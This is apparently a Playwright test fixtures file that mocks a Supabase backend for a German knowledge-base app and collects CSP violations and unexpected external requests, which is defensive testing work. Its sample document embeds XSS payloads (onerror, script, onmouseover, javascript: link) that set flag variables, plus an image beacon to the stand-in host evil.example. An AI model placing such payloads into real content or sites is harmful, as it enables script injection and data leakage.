// Test fixtures: a mocked Supabase backend plus collectors for CSP violations and runtime errors.
import { test as base, expect } from '@playwright/test';

export const MALICIOUS_DOC = {
  id: '00000000-0000-4000-8000-000000000001',
  title: '<img src=x onerror="window.__xss=1">Quartalsbericht',
  source_type: 'file',
  summary: 'Zusammenfassung <script>window.__xss=2</script>',
  raw_content: 'Roh',
  tags: ['<b onmouseover="window.__xss=5">tag</b>'],
  created_at: '2026-09-01T10:00:00Z',
};

export const PLAIN_DOC = {
  id: '00000000-0000-4000-8000-000000000002',
  title: 'Projekt Beta Kickoff',
  source_type: 'meeting_notes',
  summary: 'Kickoff Protokoll',
  raw_content: 'Der Launch von Projekt Beta ist für den 3. März geplant.',
  tags: ['meeting'],
  created_at: '2026-09-02T10:00:00Z',
};

const SECTIONS = {
  [MALICIOUS_DOC.id]: [
    {
      heading: '## Inhalt',
      markdown_content:
        '# Bericht\n\n<img src=x onerror="window.__xss=3"> [klick](javascript:window.__xss=4) ![beacon](https://evil.example/leak?d=1)\n\nNormaler Text.',
    },
  ],
  [PLAIN_DOC.id]: [{ heading: '## Überblick', markdown_content: 'Der Launch von Projekt Beta ist für den 3. März geplant. Anna leitet das Design.' }],
};

/**
 * @param {import('@playwright/test').Page} page
 * @param {{ hardened: boolean, anonymousAuth: boolean }} mode
 */
export async function mockSupabase(page, mode) {
  /** @type {Array<{ method: string, url: string, body: string | null, auth: string | undefined }>} */
  const calls = [];
  await page.route(/^https:\/\/[a-z0-9]+\.supabase\.co\//, async (route) => {
    const req = route.request();
    const url = new URL(req.url());
    calls.push({ method: req.method(), url: url.pathname + url.search, body: req.postData(), auth: req.headers().authorization });
    const json = (status, body, headers = {}) =>
      route.fulfill({ status, contentType: 'application/json', headers: { 'access-control-allow-origin': '*', ...headers }, body: JSON.stringify(body) });

    if (req.method() === 'OPTIONS') {
      return route.fulfill({
        status: 204,
        headers: { 'access-control-allow-origin': '*', 'access-control-allow-headers': '*', 'access-control-allow-methods': '*' },
      });
    }
    if (url.pathname === '/auth/v1/signup') {
      if (!mode.anonymousAuth) return json(422, { code: 422, error_code: 'anonymous_provider_disabled', msg: 'Anonymous sign-ins are disabled' });
      const now = Math.floor(Date.now() / 1000);
      return json(200, {
        access_token: 'test-access-token',
        token_type: 'bearer',
        expires_in: 3600,
        expires_at: now + 3600,
        refresh_token: 'test-refresh-token',
        user: { id: '11111111-1111-4111-8111-111111111111', aud: 'authenticated', role: 'authenticated', is_anonymous: true, app_metadata: {}, user_metadata: {}, created_at: '2026-09-01T00:00:00Z' },
      });
    }
    if (url.pathname === '/rest/v1/knowledge_documents') {
      const select = url.searchParams.get('select') ?? '';
      if (select.includes('is_public')) {
        return mode.hardened ? json(200, []) : json(400, { code: '42703', message: 'column knowledge_documents.is_public does not exist' });
      }
      const idFilter = url.searchParams.get('id');
      if (idFilter) {
        const doc = [MALICIOUS_DOC, PLAIN_DOC].find((d) => `eq.${d.id}` === idFilter) ?? null;
        return json(200, doc);
      }
      if (select.includes('knowledge_sections')) {
        return json(200, [MALICIOUS_DOC, PLAIN_DOC].map((d) => ({ ...d, knowledge_sections: SECTIONS[d.id].map((s, i) => ({ ...s, section_index: i })) })));
      }
      return json(200, [MALICIOUS_DOC, PLAIN_DOC]);
    }
    if (url.pathname === '/rest/v1/knowledge_sections') {
      const docId = (url.searchParams.get('document_id') ?? '').replace(/^eq\./, '');
      return json(200, SECTIONS[docId] ?? []);
    }
    if (url.pathname === '/rest/v1/rpc/search_knowledge') {
      if (!mode.hardened) return json(404, { code: 'PGRST202', message: 'Could not find the function public.search_knowledge' });
      return json(200, [
        {
          section_id: 's1',
          document_id: PLAIN_DOC.id,
          document_title: PLAIN_DOC.title,
          heading: '## Überblick',
          markdown_content: SECTIONS[PLAIN_DOC.id][0].markdown_content,
          tags: [],
          rank: 0.61,
        },
      ]);
    }
    if (url.pathname === '/rest/v1/knowledge_entities' || url.pathname === '/rest/v1/knowledge_relations') {
      if (!mode.hardened) return json(404, { code: 'PGRST205', message: 'Could not find the table' });
      return json(200, []);
    }
    if (url.pathname === '/rest/v1/chat_history') {
      if (req.method() === 'POST') return json(201, null);
      if (req.method() === 'HEAD') return route.fulfill({ status: 200, headers: { 'access-control-allow-origin': '*', 'content-range': '0-0/2' } });
      return json(200, []);
    }
    return json(404, { code: 'PGRST000', message: `unmocked ${url.pathname}` });
  });
  return calls;
}

export const test = base.extend({
  /** Collects CSP violations, uncaught errors and unexpected console errors. */
  diagnostics: async ({ page }, use) => {
    /** @type {string[]} */
    const problems = [];
    await page.addInitScript(() => {
      document.addEventListener('securitypolicyviolation', (e) => {
        console.error(`CSP_VIOLATION ${e.violatedDirective} ${e.blockedURI}`);
      });
    });
    page.on('pageerror', (err) => problems.push(`pageerror: ${err.message}`));
    page.on('console', (msg) => {
      if (msg.type() !== 'error') return;
      const text = msg.text();
      // Mocked 4xx responses are logged by the browser; they are expected in "migration pending" scenarios.
      if (/^Failed to load resource: the server responded with a status of 4\d\d/.test(text)) return;
      problems.push(`console.error: ${text}`);
    });
    // Anything outside the app and the mocked Supabase host must not be contacted.
    await page.route(/^https?:\/\/(?!127\.0\.0\.1)(?![a-z0-9]+\.supabase\.co\/)/, (route) => {
      problems.push(`unexpected external request: ${route.request().url()}`);
      return route.abort();
    });
    await use(problems);
    expect(problems, problems.join('\n')).toEqual([]);
  },
});

export { expect };
